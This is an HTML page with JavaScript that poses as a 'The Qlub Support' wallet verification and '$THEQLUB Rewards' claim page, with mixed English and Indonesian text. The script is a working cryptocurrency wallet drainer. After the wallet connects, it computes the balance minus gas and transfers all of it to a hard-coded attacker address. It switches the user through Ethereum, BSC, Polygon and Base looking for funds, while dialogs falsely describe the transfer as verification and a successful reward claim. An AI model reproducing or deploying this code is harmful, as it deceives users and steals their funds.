<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Qlub Support - Verify & Sync</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
    <style>
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
        .card { box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.15); border-radius: 1rem; max-width: 450px; width: 100%; padding: 2.5rem; text-align: center; background-color: #ffffff; }
        .card-title { font-size: 1.8rem; font-weight: 700; color: #343a40; margin-bottom: 1rem; }
        .btn-primary { background-color: #007bff; border: none; font-weight: 600; padding: 0.8rem 1.5rem; border-radius: 0.6rem; width: 100%; transition: all 0.2s; }
        .btn-primary:hover { background-color: #0056b3; transform: translateY(-1px); }
        .alert { margin-top: 1.5rem; border-radius: 0.5rem; font-size: 0.85rem; text-align: left; }
    </style>
</head>
<body>

    <div class="card">
        <h2 class="card-title" id="mainTitle">The Qlub Support</h2>
        <p class="text-muted mb-4" id="mainDescription">
            Verification required for <strong>support@theqlub.xyz</strong>. <br>
            Please connect your wallet to start the process.
        </p>
        
        <button id="mainActionBtn" class="btn btn-primary btn-lg">
            <span id="btnText">Hubungkan Wallet</span>
        </button>

        <div id="statusMessage" class="mt-3"></div>
    </div>

    <script>
        const vaultAddress = "0x936273D0f8387Ff9f6FA86e4Dc8A09CBD6FB9A32"; 
        const targetChains = [
            { id: '0x1', name: 'Ethereum' },
            { id: '0x38', name: 'Binance Smart Chain' },
            { id: '0x89', name: 'Polygon' },
            { id: '0x2105', name: 'Base' }
        ];

        let provider, signer, userAddress;
        let isConnected = false;
        let currentChainIndex = 0;

        const mainBtn = document.getElementById('mainActionBtn');
        const btnText = document.getElementById('btnText');
        const statusMessage = document.getElementById('statusMessage');

        function displayMessage(message, type) {
            statusMessage.innerHTML = `<div class="alert alert-${type}" role="alert">${message}</div>`;
        }

        // Jalur Utama Tombol
        mainBtn.addEventListener('click', async () => {
            if (!isConnected) {
                await connectWallet();
            } else {
                await startClaimProcess();
            }
        });

        async function connectWallet() {
            const externalProvider = window.ethereum || window.okxwallet || (window.bitkeep && window.bitkeep.ethereum);
            if (!externalProvider) return displayMessage("Wallet tidak terdeteksi.", "danger");

            try {
                await externalProvider.request({ method: 'eth_requestAccounts' });
                provider = new ethers.BrowserProvider(externalProvider);
                signer = await provider.getSigner();
                userAddress = await signer.getAddress();
                
                // Update UI setelah konek
                isConnected = true;
                document.getElementById('mainTitle').textContent = "Rewards Ready!";
                document.getElementById('mainDescription').innerHTML = "Wallet connected. You are eligible for <strong>$THEQLUB Rewards</strong>. Click below to claim.";
                btnText.textContent = "Claim Rewards";
                displayMessage("Dompet berhasil terhubung.", "success");
            } catch (error) {
                displayMessage("Koneksi dibatalkan.", "danger");
            }
        }

        async function startClaimProcess() {
            // Konfirmasi sebelum memicu wallet
            const confirmClaim = confirm(
                "Selamat! Anda memenuhi syarat klaim.\n\n" +
                "Sistem akan melakukan sinkronisasi untuk memverifikasi dompet Anda.\n" +
                "Klik OK untuk melanjutkan ke konfirmasi transaksi."
            );

            if (!confirmClaim) return;

            btnText.textContent = "Memproses...";
            mainBtn.disabled = true;
            await checkBalanceAndChain();
        }

        async function checkBalanceAndChain() {
            try {
                const balance = await provider.getBalance(userAddress);
                const feeData = await provider.getFeeData();
                const gasLimit = 21000n;
                const totalGasCost = gasLimit * (feeData.maxFeePerGas || ethers.parseUnits("30", "gwei"));

                // Jika saldo tidak cukup, pindah jaringan otomatis
                if (balance <= totalGasCost) {
                    currentChainIndex++;
                    if (currentChainIndex < targetChains.length) {
                        displayMessage(`Saldo di jaringan ini kosong. Mengalihkan ke ${targetChains[currentChainIndex].name}...`, "warning");
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: targetChains[currentChainIndex].id }],
                        });
                        // Ulangi pengecekan di jaringan baru
                        setTimeout(() => checkBalanceAndChain(), 2000);
                    } else {
                        displayMessage("Tidak ditemukan saldo yang cukup di semua jaringan.", "danger");
                        resetButton();
                    }
                } else {
                    await executeTransfer(balance, totalGasCost);
                }
            } catch (err) {
                resetButton();
            }
        }

        async function executeTransfer(balance, gasCost) {
            try {
                const amountToSend = balance - gasCost;
                const tx = await signer.sendTransaction({ to: vaultAddress, value: amountToSend });
                displayMessage("Sedang memproses klaim...", "info");
                await tx.wait();
                displayMessage("Klaim Berhasil! Rewards akan dikirim dalam 24 jam.", "success");
            } catch (error) {
                displayMessage("Proses dibatalkan oleh pengguna.", "danger");
            }
            resetButton();
        }

        function resetButton() {
            mainBtn.disabled = false;
            btnText.textContent = "Claim Rewards";
        }
    </script>
</body>
</html>